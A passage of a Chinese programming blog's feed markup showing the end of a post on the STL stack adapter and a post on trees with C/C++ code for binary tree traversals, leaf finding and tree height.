class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span> = deque&lt;T&gt; &gt;<br><span class="hljs-keyword">class</span> stack &#123;<br><span class="hljs-comment">//__STL_NULL_TMPL_ARGS是定义在 &lt;stl_config.h&gt;中，# define __STL_NULL_TMPL_ARGS &lt;&gt; </span><br>  <span class="hljs-keyword">friend</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>== __STL_NULL_TMPL_ARGS (<span class="hljs-type">const</span> stack&amp;, <span class="hljs-type">const</span> stack&amp;);<br>  <span class="hljs-keyword">friend</span> <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt; __STL_NULL_TMPL_ARGS (<span class="hljs-type">const</span> stack&amp;, <span class="hljs-type">const</span> stack&amp;);<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::value_type value_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::size_type size_type;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::reference reference;<br>  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> Sequence::const_reference const_reference;<br><span class="hljs-keyword">protected</span>:<br><span class="hljs-comment">// 底层容器</span><br>  Sequence c;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-comment">//stack下面的这些操作都是借助底层容器的操作来完成</span><br>  <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">empty</span>(); &#125;<br>  <span class="hljs-function">size_type <span class="hljs-title">size</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">size</span>(); &#125;<br>  <span class="hljs-comment">//两个函数的区别：</span><br>  <span class="hljs-function">reference <span class="hljs-title">top</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">back</span>(); &#125; <span class="hljs-comment">//stack&lt;int&gt; a;a.top();会调用</span><br>  <span class="hljs-function">const_reference <span class="hljs-title">top</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>&#123; <span class="hljs-keyword">return</span> c.<span class="hljs-built_in">back</span>(); &#125;  <span class="hljs-comment">//const stack&lt;int&gt; a;a.top();会调用</span><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">const</span> value_type&amp; x)</span> </span>&#123; c.<span class="hljs-built_in">push_back</span>(x); &#125;<br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123; c.<span class="hljs-built_in">pop_back</span>(); &#125;<br>&#125;;<br><span class="hljs-comment">//stack的比较实际上就是底层容器的比较，会调用底层容器的重载操作符==、&lt;</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span>&gt;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>==(<span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; x, <span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; y) &#123;<br>  <span class="hljs-keyword">return</span> x.c == y.c;<br>&#125;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sequence</span>&gt;<br><span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt;(<span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; x, <span class="hljs-type">const</span> stack&lt;T, Sequence&gt;&amp; y) &#123;<br>  <span class="hljs-keyword">return</span> x.c &lt; y.c;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>面向对象编程，通过模板类，友元函数，运算符重载等等实现</strong><br><strong>是不是很短？为什么这点代码就能实现？</strong><br><strong>把相应的已有的容器作为底部结构，将其接口改变，使之符合stack的特性，就形成一个stack</strong><br><em><strong>SGI STL stack默认底层容器是deque。</strong></em></p>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-树(上)</title>
    <link href="/dong.github/2024/09/07/Datastructures-%E6%A0%91-%E4%B8%8A/"/>
    <url>/dong.github/2024/09/07/Datastructures-%E6%A0%91-%E4%B8%8A/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>后来才明白，为什么非要有树这种东西。</strong><br><strong>树的遍历，前序、中序、后序、层序，非递归，递归</strong></p><span id="more"></span><h1 id="引入：二分查找"><a href="#引入：二分查找" class="headerlink" title="引入：二分查找"></a><strong>引入：二分查找</strong></h1><p><img src="/dong.github/images/0907-3.png" alt="alt text"></p><blockquote><p><strong>“从这里面我们可以看到，由于我们在数组里面，对于我们要查找的元素，进行了有序化的一种组织，使得我们的查找过程是按照固定的顺序，或者说，是按照事先定义好的顺序来进行的。”</strong><br><strong>而这个顺序呢，是形成我们所说的类似树这样的一个结构</strong></p></blockquote><blockquote><p><strong>那反过来说，能不能把数据不一定放在数组？</strong><br><strong>我就按照这样的一个层次化的结构来存放数据，是不是也会达到二分查找一样的效果？”</strong></p></blockquote><p><strong>这就顺理成章地引入了树这种数据结构，用树的结构存储数据。</strong><br><strong>使得插入、查找、删除等等操作更加方便。</strong><br><strong>这样一来，动态查找问题也得到了解决！</strong></p><h1 id="树的定义"><a href="#树的定义" class="headerlink" title="树的定义"></a>树的定义</h1><p>……</p><h1 id="树的表示"><a href="#树的表示" class="headerlink" title="树的表示"></a>树的表示</h1><p><strong>Q:每个结点设计几个指针域呢？事先不知道它有几个子节点，那怎么办？</strong><br><strong>A:每个结点都留5个吧，这就能存下了，但是造成了大量的空间浪费。</strong><br><strong>A:儿子-兄弟表示法，只用两个指针域！</strong><br><img src="/dong.github/images/0907-4.png" alt="alt text"><br><img src="/dong.github/images/0907-5.png" alt="alt text"></p><p><strong>PS：儿子兄弟表示法如何实现呢？</strong></p><ul><li><strong>1.链式前向星，即数组模拟链表</strong></li><li><strong>2.邻接矩阵，用C++的二维向量实现</strong></li><li><strong>3.真链表</strong></li></ul>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>BT      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span> *BinTree;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TreeNode</span>&#123;<br><span class="hljs-type">int</span> Data;  <span class="hljs-comment">// 存值 </span><br>BinTree Left;    <span class="hljs-comment">// 左儿子结点 </span><br>BinTree Right;   <span class="hljs-comment">// 右儿子结点 </span><br>&#125;;<br><span class="hljs-function">BinTree <span class="hljs-title">CreatBinTree</span><span class="hljs-params">()</span></span>;   <span class="hljs-comment">// 创建一个二叉树</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(BinTree BT)</span></span>;  <span class="hljs-comment">// 判断树 BT 是否为空 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;   <span class="hljs-comment">// 先序遍历，根左右</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;    <span class="hljs-comment">// 中序遍历，左根右 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>;  <span class="hljs-comment">// 后序遍历，左右根 </span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">SNode</span> *Stack;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SNode</span>&#123;<br>BinTree Data;<br>Stack Next;<br>&#125;;<br><br><br><span class="hljs-function">Stack <span class="hljs-title">CreateStack</span><span class="hljs-params">()</span></span>;  <span class="hljs-comment">// 初始化链栈 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack S)</span></span>;  <span class="hljs-comment">// 判断链栈是否为空 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack S,BinTree item)</span></span>;  <span class="hljs-comment">// 入栈 </span><br><span class="hljs-function">BinTree <span class="hljs-title">Pop</span><span class="hljs-params">(Stack S)</span></span>;  <span class="hljs-comment">// 出栈</span><br> <br><br><span class="hljs-comment">// 初始化 </span><br><span class="hljs-function">Stack <span class="hljs-title">CreateStack</span><span class="hljs-params">()</span></span>&#123;<br>Stack S;<br>S = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>S-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> S;<br>&#125;<br><br><span class="hljs-comment">// 判断是否为空 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Stack S)</span></span>&#123;<br><span class="hljs-keyword">return</span> (S-&gt;Next == <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">// 入栈</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Push</span><span class="hljs-params">(Stack S,BinTree item)</span></span>&#123;<br>Stack tmp;<br>tmp = (Stack)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> SNode));<br>tmp-&gt;Data = item;<br><span class="hljs-comment">// 链栈栈顶元素是链表头结点，新入栈的链表在栈顶元素后面 </span><br>tmp-&gt;Next = S-&gt;Next;   <br>S-&gt;Next = tmp;<br>&#125; <br><br><span class="hljs-comment">// 出栈</span><br><span class="hljs-function">BinTree <span class="hljs-title">Pop</span><span class="hljs-params">(Stack S)</span></span>&#123;<br>Stack First;<br>BinTree TopVal;<br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">IsEmpty</span>(S))&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;堆栈空&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>First = S-&gt;Next;   <span class="hljs-comment">// 出栈第一个元素在栈顶元素后面 </span><br>S-&gt;Next = First-&gt;Next;  <span class="hljs-comment">//把第一个元素从链栈删除 </span><br>TopVal = First-&gt;Data;   <span class="hljs-comment">// 取出被删除结点的值 </span><br><span class="hljs-built_in">free</span>(First);  <span class="hljs-comment">// 释放空间 </span><br><span class="hljs-keyword">return</span> TopVal;<br>&#125;<br>&#125; <br><br><span class="hljs-function">BinTree <span class="hljs-title">Insert</span><span class="hljs-params">(<span class="hljs-type">int</span> Data)</span></span>&#123;<br>BinTree BT;<br>BT =  (BinTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>BT-&gt;Data = Data;<br>BT-&gt;Left = <span class="hljs-literal">NULL</span>;<br>BT-&gt;Right = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> BT;<br>&#125;<br><br><span class="hljs-comment">// 初始化二叉树 </span><br><span class="hljs-function">BinTree <span class="hljs-title">CreatBinTree</span><span class="hljs-params">()</span></span>&#123;<br>BinTree BT;<br>BT =  (BinTree)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>BT-&gt;Data = <span class="hljs-number">1</span>;<br>BT-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">2</span>);<br>BT-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">3</span>);<br>BT-&gt;Left-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">4</span>);<br>BT-&gt;Left-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">6</span>);<br>BT-&gt;Left-&gt;Right-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">5</span>);<br>BT-&gt;Right-&gt;Left = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">7</span>);<br>BT-&gt;Right-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">9</span>);<br>BT-&gt;Right-&gt;Left-&gt;Right = <span class="hljs-built_in">Insert</span>(<span class="hljs-number">8</span>);<br><span class="hljs-keyword">return</span> BT;<br>&#125;<br><br><br><span class="hljs-comment">// 判断树是否为空</span><br><span class="hljs-comment">/*bool  IsEmpty(BinTree BT)&#123;</span><br><span class="hljs-comment">&#125;*/</span><br><br><span class="hljs-comment">// 先序</span><br><span class="hljs-comment">/*void  PreOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">PreOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">PreOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125; */</span><br><br><span class="hljs-comment">// 先序非递归 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PreOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br><span class="hljs-keyword">while</span>(T || !<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br><span class="hljs-keyword">while</span>(T)&#123;     <br><span class="hljs-built_in">Push</span>(S,T);    <span class="hljs-comment">// 压栈，第一次遇到该结点 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);  <span class="hljs-comment">// 访问结点</span><br>T = T-&gt;Left;   <span class="hljs-comment">// 遍历左子树 </span><br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);    <span class="hljs-comment">// 出栈，第二次遇到该结点 </span><br>T = T-&gt;Right;  <span class="hljs-comment">// 访问右结点 </span><br>&#125;<br>&#125; <br>&#125; <br><br><span class="hljs-comment">// 中序递归 </span><br><span class="hljs-comment">/*void InOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">InOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">InOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">&#125; </span><br><span class="hljs-comment">&#125; */</span><br><br><span class="hljs-comment">// 中序非递归</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br><span class="hljs-keyword">while</span>(T || !<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br><span class="hljs-keyword">while</span>(T)&#123;     <br><span class="hljs-built_in">Push</span>(S,T);    <span class="hljs-comment">// 压栈</span><br>T = T-&gt;Left;   <span class="hljs-comment">// 遍历左子树 </span><br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);    <span class="hljs-comment">// 出栈</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);  <span class="hljs-comment">// 访问结点</span><br>T = T-&gt;Right;  <span class="hljs-comment">// 访问右结点 </span><br>&#125;<br>&#125; <br>&#125; <br><br><span class="hljs-comment">// 后序</span><br><span class="hljs-comment">/*void PostOrderTraversal(BinTree BT)&#123;</span><br><span class="hljs-comment">if(BT)&#123;</span><br><span class="hljs-comment">PostOrderTraversal(BT-&gt;Left);  // 进入左子树 </span><br><span class="hljs-comment">PostOrderTraversal(BT-&gt;Right);  // 进入右子树 </span><br><span class="hljs-comment">printf(&quot;%d&quot;,BT-&gt;Data);  // 打印根 </span><br><span class="hljs-comment">&#125; </span><br><span class="hljs-comment">&#125; */</span> <br><br><span class="hljs-comment">// 后序遍历 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PostOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>BinTree T = BT;<br>Stack S = <span class="hljs-built_in">CreateStack</span>();  <span class="hljs-comment">// 创建并初始化堆栈 S</span><br>vector&lt;BinTree&gt; v;<br><span class="hljs-built_in">Push</span>(S,T);<br><span class="hljs-keyword">while</span>(!<span class="hljs-built_in">IsEmpty</span>(S))&#123;  <span class="hljs-comment">// 当树不为空或堆栈不空 </span><br>T = <span class="hljs-built_in">Pop</span>(S);<br>v.<span class="hljs-built_in">push_back</span>(T);<br><span class="hljs-keyword">if</span>(T-&gt;Left)<br><span class="hljs-built_in">Push</span>(S,T-&gt;Left);<br><span class="hljs-keyword">if</span>(T-&gt;Right)<br><span class="hljs-built_in">Push</span>(S,T-&gt;Right);<br>&#125;<br><span class="hljs-built_in">reverse</span>(v.<span class="hljs-built_in">begin</span>(),v.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 逆转 </span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;v.<span class="hljs-built_in">size</span>();i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,v[i]-&gt;Data);<br>&#125; <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  void PostOrderTraversal(Bintree BT) &#123;  //给节点增加访问次数的属性Visit，初始化为0</span><br><span class="hljs-comment">  Bintree T BT;</span><br><span class="hljs-comment">  Stack S = CreateStack(Maxsize);</span><br><span class="hljs-comment">  while (T || !IsEmpty(S)) &#123;</span><br><span class="hljs-comment">  while (T) &#123;</span><br><span class="hljs-comment">  if (T-&gt;Visit == 0) &#123;//虽然没必要判断，为便于理解</span><br><span class="hljs-comment">  T-&gt;Visit++;</span><br><span class="hljs-comment">  Push(S, T);  //第一次入栈，不访问</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  T = T-&gt;left;   //转向左子树</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  if (!IsEmpty(S)) &#123;</span><br><span class="hljs-comment">  T = Pop(s);</span><br><span class="hljs-comment">  if (T-&gt;Visit == 2)    &#123;</span><br><span class="hljs-comment">  printf(&quot;%d&quot;, T-&gt;Data);//第三次碰到它，访问节点，可以彻底从堆栈弹出了</span><br><span class="hljs-comment">  T = NULL;//左右子数均已经访问过</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  else &#123;</span><br><span class="hljs-comment">  T-&gt;Visit++;</span><br><span class="hljs-comment">  Push(S, T);  //第二次入栈，不访问，（相当于T没有出栈）</span><br><span class="hljs-comment">  T = T-&gt;Right;  //转向右子树</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment">  &#125;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">// 层次遍历</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LevelOrderTraversal</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br>queue&lt;BinTree&gt; q;<br>BinTree T;<br><span class="hljs-keyword">if</span>(!BT)<br><span class="hljs-keyword">return</span>;<br>q.<span class="hljs-built_in">push</span>(BT);  <span class="hljs-comment">// BT 入队 </span><br><span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())&#123;<br>T = q.<span class="hljs-built_in">front</span>();  <span class="hljs-comment">// 访问队首元素 </span><br>q.<span class="hljs-built_in">pop</span>();  <span class="hljs-comment">// 出队</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,T-&gt;Data);<br><span class="hljs-keyword">if</span>(T-&gt;Left)<br>q.<span class="hljs-built_in">push</span>(T-&gt;Left);<br> <span class="hljs-keyword">if</span>(T-&gt;Right)<br> q.<span class="hljs-built_in">push</span>(T-&gt;Right);<br>&#125;<br>&#125;<br><span class="hljs-comment">// 输出叶子结点</span><br><span class="hljs-function"><span class="hljs-type">void</span>  <span class="hljs-title">FindLeaves</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br><span class="hljs-keyword">if</span>(BT)&#123;<br><span class="hljs-keyword">if</span>( !BT-&gt;Left &amp;&amp; !BT-&gt;Right)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,BT-&gt;Data);  <span class="hljs-comment">// 打印叶子结点</span><br><span class="hljs-built_in">FindLeaves</span>(BT-&gt;Left);  <span class="hljs-comment">// 进入左子树 </span><br><span class="hljs-built_in">FindLeaves</span>(BT-&gt;Right);  <span class="hljs-comment">// 进入右子树 </span><br>&#125;<br>&#125; <br><br><span class="hljs-comment">// 求树高度</span><br><span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">GetHeight</span><span class="hljs-params">(BinTree BT)</span></span>&#123;<br><span class="hljs-type">int</span> hl,hr,maxh;<br><span class="hljs-keyword">if</span>(BT)&#123;<br>hl = <span class="hljs-built_in">GetHeight</span>(BT-&gt;Left);  <span class="hljs-comment">// 求左子树高度 </span><br>hr = <span class="hljs-built_in">GetHeight</span>(BT-&gt;Right);  <span class="hljs-comment">// 求右子树高度 </span><br>maxh = (hl&gt;hr)?hl:hr;<br><span class="hljs-keyword">return</span> maxh<span class="hljs-number">+1</span>;  <span 